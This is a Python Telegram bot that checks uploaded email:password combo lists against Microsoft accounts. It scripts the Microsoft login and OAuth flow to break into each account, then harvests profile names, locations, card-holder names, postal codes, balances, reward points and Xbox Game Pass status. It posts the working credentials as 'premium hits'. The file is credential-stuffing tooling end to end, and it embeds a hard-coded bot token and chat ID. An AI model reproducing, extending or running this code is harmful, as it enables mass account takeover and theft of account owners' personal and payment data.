#!/usr/bin/env python3
"""
XBOX PREMIUM CHECKER BOT - COMPLETE
Single bot token: 8657130802:AAE8Ynf791ramxyFktFPHgwuv0b5vNKiKH0
- Receives .txt files
- Validates Microsoft/Hotmail/Outlook accounts
- Checks Xbox Game Pass subscription (9-step validation)
- Sends premium hits with aesthetic formatting
- Batch results every 10 accounts
- Queue system for multiple files
"""

import os
import re
import json
import uuid
import time
import sqlite3
import logging
import requests
import asyncio
from datetime import datetime, timedelta
from threading import Lock
from urllib.parse import quote, unquote
from pathlib import Path

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ============================================================
# CONFIGURATION - SINGLE BOT
# ============================================================

BOT_TOKEN = "8657130802:AAE8Ynf791ramxyFktFPHgwuv0b5vNKiKH0"
CHAT_ID = "8260250818"  # Same chat where bot runs

DATA_DIR = "/app/data" if os.path.exists("/app") else "data"
os.makedirs(DATA_DIR, exist_ok=True)

DB_FILE = os.path.join(DATA_DIR, "checked.db")
RESULT_DIR = os.path.join(DATA_DIR, "results")
os.makedirs(RESULT_DIR, exist_ok=True)

logging.basicConfig(format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# ============================================================
# DATABASE
# ============================================================

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS processed_files (
        file_id TEXT PRIMARY KEY,
        file_name TEXT,
        processed_at TIMESTAMP
    )''')
    conn.commit()
    conn.close()

def is_file_processed(file_id: str) -> bool:
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT 1 FROM processed_files WHERE file_id = ?", (file_id,))
    result = c.fetchone()
    conn.close()
    return result is not None

def mark_file_processed(file_id: str, file_name: str):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO processed_files (file_id, file_name, processed_at) VALUES (?, ?, ?)",
              (file_id, file_name, datetime.now().isoformat()))
    conn.commit()
    conn.close()

# ============================================================
# ORIGINAL XBOX CHECKER - COMPLETE 9-STEP VALIDATION
# ============================================================

class XboxChecker:
    def __init__(self, debug=False):
        self.debug = debug
        
    def log(self, message):
        if self.debug:
            logger.info("[DEBUG] " + message)
    
    def get_remaining_days(self, date_str):
        try:
            if not date_str:
                return "0"
            renewal_date = datetime.fromisoformat(date_str.replace('Z', '+00:00'))
            today = datetime.now(renewal_date.tzinfo)
            remaining = (renewal_date - today).days
            return str(remaining)
        except:
            return "0"
    
    def format_hit_message(self, email, password, data):
        """Format premium hit with aesthetic style - same as your original"""
        premium_type = data.get('premium_type', 'GAME PASS ULTIMATE')
        country = data.get('country', 'US')
        days = data.get('days_remaining', '30')
        auto_renew = data.get('auto_renew', 'YES')
        renewal_date = data.get('renewal_date', 'N/A')
        total_amount = data.get('total_amount', '0')
        currency = data.get('currency', 'USD')
        name = data.get('name', '')
        card_holder = data.get('card_holder', '')
        rewards_points = data.get('rewards_points', '')
        
        if renewal_date != 'N/A':
            try:
                renewal_obj = datetime.fromisoformat(renewal_date)
                renewal_formatted = renewal_obj.strftime('%b %d, %Y')
            except:
                renewal_formatted = renewal_date
        else:
            renewal_formatted = 'N/A'
        
        message = "૮₍ ˶ᵔ ᵕ ᵔ˶ ₎ა 🎮🎀\n"
        message += f"🌷 <code>{email}</code> 🌷 🔐 <code>{password}</code>\n"
        message += f"🌸 <b>{premium_type}</b> ({country}) ⏳ {days} days 🔁 <b>Renews {renewal_formatted}</b> 💸 ${total_amount} {currency}\n"
        
        if name:
            message += f"🍉 <i>{name}</i> ✧ ♡\n"
        if card_holder:
            message += f"💳 {card_holder}\n"
        if rewards_points:
            message += f"⭐ {rewards_points} points\n"
            
        message += "૮₍ ˶•⤙•˶ ₎ა ✧💖\n"
        message += f"✨ <b>𝑩𝒀 @StarLuxHub</b> ✨"
        
        return message
    
    def check(self, email, password):
        """Complete 9-step Microsoft/Xbox validation"""
        try:
            self.log("Checking: " + email)
            
            session = requests.Session()
            correlation_id = str(uuid.uuid4())
            
            # ============================================================
            # STEP 1: IDP Check
            # ============================================================
            self.log("Step 1: IDP check...")
            url1 = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=" + email
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": correlation_id,
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            
            r1 = session.get(url1, headers=headers1, timeout=15)
            self.log("IDP Response: " + str(r1.status_code))
            
            if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text:
                self.log("IDP check failed")
                return {"status": "BAD", "data": {}}
            
            if "MSAccount" not in r1.text:
                self.log("MSAccount not found")
                return {"status": "BAD", "data": {}}
            
            self.log("IDP check success")
            
            # ============================================================
            # STEP 2: OAuth Authorize
            # ============================================================
            self.log("Step 2: OAuth authorize...")
            time.sleep(0.5)
            
            url2 = "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint=" + email + "&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            
            headers2 = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive"
            }
            
            r2 = session.get(url2, headers=headers2, allow_redirects=True, timeout=15)
            
            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            
            if not url_match or not ppft_match:
                self.log("PPFT or URL not found")
                return {"status": "BAD", "data": {}}
            
            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)
            
            self.log("PPFT found: " + ppft[:30] + "...")
            
            # ============================================================
            # STEP 3: Login POST
            # ============================================================
            self.log("Step 3: Login POST...")
            login_data = "i13=1&login=" + email + "&loginfmt=" + email + "&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=" + password + "&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=" + ppft + "&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
            
            headers3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }
            
            r3 = session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=15)
            self.log("Login Response: " + str(r3.status_code))
            
            if "account or password is incorrect" in r3.text or r3.text.count("error") > 0:
                self.log("Bad credentials")
                return {"status": "BAD", "data": {}}
            
            if "https://account.live.com/identity/confirm" in r3.text:
                self.log("2FA required")
                return {"status": "2FACTOR", "data": {}}
            
            if "https://account.live.com/Abuse" in r3.text:
                self.log("Account banned")
                return {"status": "BANNED", "data": {}}
            
            location = r3.headers.get("Location", "")
            if not location:
                self.log("Redirect location not found")
                return {"status": "BAD", "data": {}}
            
            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                self.log("Auth code not found")
                return {"status": "BAD", "data": {}}
            
            code = code_match.group(1)
            self.log("Auth code obtained: " + code[:30] + "...")
            
            mspcid = session.cookies.get("MSPCID", "")
            if not mspcid:
                self.log("CID not found")
                return {"status": "BAD", "data": {}}
            
            cid = mspcid.upper()
            self.log("CID: " + cid)
            
            # ============================================================
            # STEP 4: Get Access Token
            # ============================================================
            self.log("Step 4: Getting token...")
            token_data = "client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code=" + code + "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            
            r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", 
                            data=token_data, 
                            headers={"Content-Type": "application/x-www-form-urlencoded"},
                            timeout=15)
            
            if "access_token" not in r4.text:
                self.log("Access token not obtained")
                return {"status": "BAD", "data": {}}
            
            token_json = r4.json()
            access_token = token_json["access_token"]
            self.log("Token obtained")
            
            # ============================================================
            # STEP 5: Get Profile Info
            # ============================================================
            self.log("Step 5: Getting profile info...")
            profile_headers = {
                "User-Agent": "Outlook-Android/2.0",
                "Authorization": "Bearer " + access_token,
                "X-AnchorMailbox": "CID:" + cid
            }
            
            country = ""
            name = ""
            
            try:
                r5 = session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", 
                                headers=profile_headers, timeout=15)
                
                if r5.status_code == 200:
                    profile = r5.json()
                    
                    if "location" in profile and profile["location"]:
                        location_val = profile["location"]
                        if isinstance(location_val, str):
                            country = location_val.split(',')[-1].strip()
                        elif isinstance(location_val, dict):
                            country = location_val.get("country", "")
                    
                    if "displayName" in profile and profile["displayName"]:
                        name = profile["displayName"]
                    
                    self.log("Profile: Name=" + name + " | Country=" + country)
            except Exception as e:
                self.log("Profile error: " + str(e))
            
            # ============================================================
            # STEP 6: Get Xbox Payment Token
            # ============================================================
            self.log("Step 6: Getting Xbox payment token...")
            time.sleep(0.5)
            
            user_id = str(uuid.uuid4()).replace('-', '')[:16]
            state_json = json.dumps({"userId": user_id, "scopeSet": "pidl"})
            
            payment_auth_url = "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=" + quote(state_json) + "&prompt=none"
            
            headers6 = {
                "Host": "login.live.com",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive",
                "Referer": "https://account.microsoft.com/"
            }
            
            r6 = session.get(payment_auth_url, headers=headers6, allow_redirects=True, timeout=20)
            
            # Extract payment token
            payment_token = None
            search_text = r6.text + " " + r6.url
            
            token_patterns = [
                r'access_token=([^&\s"\']+)',
                r'"access_token":"([^"]+)"'
            ]
            
            for pattern in token_patterns:
                match = re.search(pattern, search_text)
                if match:
                    payment_token = unquote(match.group(1))
                    break
            
            if not payment_token:
                self.log("Payment token not obtained - FREE")
                return {"status": "FREE", "data": {"country": country, "name": name}}
            
            self.log("Payment token obtained")
            
            # ============================================================
            # STEP 7: Check Payment Instruments
            # ============================================================
            self.log("Step 7: Checking payment instruments...")
            
            payment_data = {"country": country, "name": name}
            subscription_data = {}
            
            correlation_id2 = str(uuid.uuid4())
            
            payment_headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Pragma": "no-cache",
                "Accept": "application/json",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US,en;q=0.9",
                "Authorization": 'MSADELEGATE1.0="' + payment_token + '"',
                "Connection": "keep-alive",
                "Content-Type": "application/json",
                "Host": "paymentinstruments.mp.microsoft.com",
                "ms-cV": correlation_id2,
                "Origin": "https://account.microsoft.com",
                "Referer": "https://account.microsoft.com/",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-site"
            }
            
            try:
                payment_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
                r7 = session.get(payment_url, headers=payment_headers, timeout=15)
                
                if r7.status_code == 200:
                    balance_match = re.search(r'"balance"\s*:\s*([0-9.]+)', r7.text)
                    if balance_match:
                        payment_data['balance'] = "$" + balance_match.group(1)
                    
                    card_match = re.search(r'"paymentMethodFamily"\s*:\s*"credit_card".*?"name"\s*:\s*"([^"]+)"', r7.text, re.DOTALL)
                    if card_match:
                        payment_data['card_holder'] = card_match.group(1)
                    
                    if not country:
                        country_match = re.search(r'"country"\s*:\s*"([^"]+)"', r7.text)
                        if country_match:
                            payment_data['country'] = country_match.group(1)
                    
                    zip_match = re.search(r'"postal_code"\s*:\s*"([^"]+)"', r7.text)
                    if zip_match:
                        payment_data['zipcode'] = zip_match.group(1)
                    
                    city_match = re.search(r'"city"\s*:\s*"([^"]+)"', r7.text)
                    if city_match:
                        payment_data['city'] = city_match.group(1)
            except Exception as e:
                self.log("Payment instruments error: " + str(e))
            
            # ============================================================
            # STEP 8: Get Bing Rewards
            # ============================================================
            try:
                rewards_r = session.get("https://rewards.bing.com/", timeout=10)
                points_match = re.search(r'"availablePoints"\s*:\s*(\d+)', rewards_r.text)
                if points_match:
                    payment_data['rewards_points'] = points_match.group(1)
            except:
                pass
            
            # ============================================================
            # STEP 9: Check Subscription (Xbox Game Pass)
            # ============================================================
            self.log("Step 9: Checking subscription...")
            
            try:
                trans_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
                r8 = session.get(trans_url, headers=payment_headers, timeout=15)
                
                if r8.status_code == 200:
                    response_text = r8.text
                    
                    premium_keywords = {
                        'Xbox Game Pass Ultimate': 'GAME PASS ULTIMATE',
                        'PC Game Pass': 'PC GAME PASS',
                        'EA Play': 'EA PLAY',
                        'Xbox Live Gold': 'XBOX LIVE GOLD',
                        'Game Pass': 'GAME PASS'
                    }
                    
                    has_premium = False
                    premium_type = "FREE"
                    
                    for keyword, type_name in premium_keywords.items():
                        if keyword in response_text:
                            has_premium = True
                            premium_type = type_name
                            break
                    
                    if has_premium:
                        title_match = re.search(r'"title"\s*:\s*"([^"]+)"', response_text)
                        if title_match:
                            subscription_data['title'] = title_match.group(1)
                        
                        start_match = re.search(r'"startDate"\s*:\s*"([^T"]+)', response_text)
                        if start_match:
                            subscription_data['start_date'] = start_match.group(1)
                        
                        renewal_match = re.search(r'"nextRenewalDate"\s*:\s*"([^T"]+)', response_text)
                        if renewal_match:
                            renewal_date = renewal_match.group(1)
                            subscription_data['renewal_date'] = renewal_date
                            subscription_data['days_remaining'] = self.get_remaining_days(renewal_date + "T00:00:00Z")
                        
                        auto_match = re.search(r'"autoRenew"\s*:\s*(true|false)', response_text)
                        if auto_match:
                            subscription_data['auto_renew'] = "YES" if auto_match.group(1) == "true" else "NO"
                        
                        amount_match = re.search(r'"totalAmount"\s*:\s*([0-9.]+)', response_text)
                        if amount_match:
                            subscription_data['total_amount'] = amount_match.group(1)
                        
                        currency_match = re.search(r'"currency"\s*:\s*"([^"]+)"', response_text)
                        if currency_match:
                            subscription_data['currency'] = currency_match.group(1)
                        
                        if not payment_data.get('country'):
                            country_match = re.search(r'"country"\s*:\s*"([^"]+)"', response_text)
                            if country_match:
                                payment_data['country'] = country_match.group(1)
                        
                        subscription_data['premium_type'] = premium_type
                        subscription_data['has_premium'] = True
                        
                        days_rem = subscription_data.get('days_remaining', '0')
                        if days_rem.startswith('-'):
                            self.log("Subscription expired")
                            return {"status": "EXPIRED", "data": {**payment_data, **subscription_data}}
                        
                        self.log("Premium found: " + premium_type)
                        return {"status": "PREMIUM", "data": {**payment_data, **subscription_data}}
                    else:
                        self.log("No subscription - FREE")
                        return {"status": "FREE", "data": payment_data}
            except Exception as e:
                self.log("Subscription error: " + str(e))
                return {"status": "FREE", "data": payment_data}
            
            return {"status": "FREE", "data": {**payment_data, **subscription_data}}
            
        except requests.exceptions.Timeout:
            self.log("Timeout")
            return {"status": "TIMEOUT", "data": {}}
        except Exception as e:
            self.log("Exception: " + str(e))
            return {"status": "ERROR", "data": {}}

# ============================================================
# FILE PROCESSING
# ============================================================

processing_queue = []
processing_active = False
processing_lock = Lock()

async def send_message(update_obj, message: str, parse_mode='HTML'):
    try:
        await update_obj.message.reply_text(message, parse_mode=parse_mode)
    except Exception as e:
        logger.error(f"Send error: {e}")

async def process_file(file_path: str, file_name: str, file_id: str, update_obj):
    global processing_active
    
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [l.strip() for l in f if l.strip() and ':' in l]
        
        if not lines:
            await send_message(update_obj, f"❌ No valid accounts in {file_name}")
            return
        
        stats = {
            'total': len(lines),
            'premium': 0,
            'free': 0,
            'bad': 0,
            'twofa': 0,
            'banned': 0,
            'expired': 0,
            'timeout': 0,
            'error': 0
        }
        
        checker = XboxChecker(debug=False)
        batch_results = []
        batch_size = 10
        
        await send_message(update_obj, f"🚀 **Checking:** {file_name}\n📊 **Total:** {stats['total']} accounts")
        
        for idx, line in enumerate(lines, 1):
            try:
                email, password = line.split(':', 1)
                email = email.strip()
                password = password.strip()
                
                result = checker.check(email, password)
                status = result['status']
                data = result.get('data', {})
                
                if status == 'PREMIUM':
                    stats['premium'] += 1
                    batch_results.append(f"✅ {email[:35]}... - PREMIUM")
                    # Send formatted premium hit
                    msg = checker.format_hit_message(email, password, data)
                    await send_message(update_obj, msg)
                    
                elif status == 'FREE':
                    stats['free'] += 1
                    batch_results.append(f"🆓 {email[:35]}... - FREE")
                elif status == '2FACTOR':
                    stats['twofa'] += 1
                    stats['bad'] += 1
                    batch_results.append(f"🔐 {email[:35]}... - 2FA")
                elif status == 'BANNED':
                    stats['banned'] += 1
                    stats['bad'] += 1
                    batch_results.append(f"🚫 {email[:35]}... - BANNED")
                elif status == 'EXPIRED':
                    stats['expired'] += 1
                    stats['bad'] += 1
                    batch_results.append(f"⏰ {email[:35]}... - EXPIRED")
                elif status == 'TIMEOUT':
                    stats['timeout'] += 1
                    stats['bad'] += 1
                    batch_results.append(f"⏱️ {email[:35]}... - TIMEOUT")
                elif status == 'ERROR':
                    stats['error'] += 1
                    stats['bad'] += 1
                    batch_results.append(f"⚠️ {email[:35]}... - ERROR")
                else:
                    stats['bad'] += 1
                    batch_results.append(f"❌ {email[:35]}... - BAD")
                
                # Send batch update
                if len(batch_results) >= batch_size:
                    progress = f"📊 **Progress:** {idx}/{stats['total']}\n✅ P:{stats['premium']} 🆓 F:{stats['free']} ❌ B:{stats['bad']}\n\n```\n" + "\n".join(batch_results) + "\n```"
                    await send_message(update_obj, progress)
                    batch_results = []
                
                await asyncio.sleep(0.15)
                
            except Exception as e:
                stats['error'] += 1
                stats['bad'] += 1
                logger.error(f"Line error: {e}")
        
        # Send remaining batch
        if batch_results:
            progress = f"📊 **Final Batch:**\n\n```\n" + "\n".join(batch_results) + "\n```"
            await send_message(update_obj, progress)
        
        # Final summary
        summary = (
            f"✅ **SCAN COMPLETE**\n\n"
            f"📄 **File:** `{file_name}`\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🔢 **Total:** `{stats['total']}`\n"
            f"✅ **PREMIUM:** `{stats['premium']}`\n"
            f"🆓 **FREE:** `{stats['free']}`\n"
            f"❌ **BAD:** `{stats['bad']}`\n"
            f"🔐 **2FA:** `{stats['twofa']}`\n"
            f"🚫 **BANNED:** `{stats['banned']}`\n"
            f"⏰ **EXPIRED:** `{stats['expired']}`\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
        )
        await send_message(update_obj, summary)
        
        mark_file_processed(file_id, file_name)
        
    except Exception as e:
        logger.error(f"Process error: {e}")
        await send_message(update_obj, f"❌ Error: {str(e)[:200]}")
    
    finally:
        if os.path.exists(file_path):
            try:
                os.remove(file_path)
            except:
                pass
        
        with processing_lock:
            processing_active = False
            if processing_queue:
                next_item = processing_queue.pop(0)
                asyncio.create_task(process_file(next_item[0], next_item[1], next_item[2], next_item[3]))

# ============================================================
# TELEGRAM HANDLERS
# ============================================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "🎮 **XBOX PREMIUM CHECKER BOT**\n\n"
        "Send a `.txt` file with `email:password` format\n\n"
        "**Supported domains:**\n"
        "hotmail.com, outlook.com, live.com, msn.com\n\n"
        "**What it does:**\n"
        "• Validates Microsoft accounts\n"
        "• Checks Xbox Game Pass subscription\n"
        "• Premium hits with subscription details\n"
        "• Batch results every 10 accounts\n\n"
        "**Commands:**\n"
        "/start - This message\n"
        "/status - Queue status"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    with processing_lock:
        queue_size = len(processing_queue)
        is_active = processing_active
    
    msg = f"📊 **Status**\n\n🔄 Processing: {'Yes' if is_active else 'No'}\n⏳ Queue: {queue_size}"
    await update.message.reply_text(msg, parse_mode='Markdown')

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global processing_active
    
    doc = update.message.document
    
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please send a `.txt` file")
        return
    
    if is_file_processed(doc.file_id):
        await update.message.reply_text(f"⚠️ `{doc.file_name}` already processed", parse_mode='Markdown')
        return
    
    file = await context.bot.get_file(doc.file_id)
    temp_path = f"/tmp/{doc.file_name}"
    await file.download_to_drive(temp_path)
    
    with open(temp_path, 'r', encoding='utf-8', errors='ignore') as f:
        lines = [l.strip() for l in f if l.strip() and ':' in l]
    
    if not lines:
        await update.message.reply_text(f"❌ No valid accounts in {doc.file_name}")
        os.remove(temp_path)
        return
    
    with processing_lock:
        queue_pos = len(processing_queue) + 1
        processing_queue.append((temp_path, doc.file_name, doc.file_id, update))
        
        if not processing_active:
            processing_active = True
            first = processing_queue.pop(0)
            asyncio.create_task(process_file(first[0], first[1], first[2], first[3]))
    
    await update.message.reply_text(
        f"✅ **File Accepted**\n\n"
        f"📄 `{doc.file_name}`\n"
        f"🔢 Accounts: {len(lines)}\n"
        f"📊 Position: {queue_pos}\n\n"
        f"🔄 Processing started...",
        parse_mode='Markdown'
    )

# ============================================================
# MAIN
# ============================================================

async def main():
    init_db()
    
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("status", status_cmd))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    print("\n" + "="*50)
    print("🎮 XBOX PREMIUM CHECKER BOT")
    print("="*50)
    print(f"Bot Token: {BOT_TOKEN[:15]}...")
    print("Bot is running!")
    print("Send .txt files to check accounts")
    print("="*50 + "\n")
    
    await app.initialize()
    await app.start()
    await app.updater.start_polling()
    
    try:
        await asyncio.Event().wait()
    except KeyboardInterrupt:
        pass
    finally:
        await app.stop()

if __name__ == "__main__":
    asyncio.run(main())
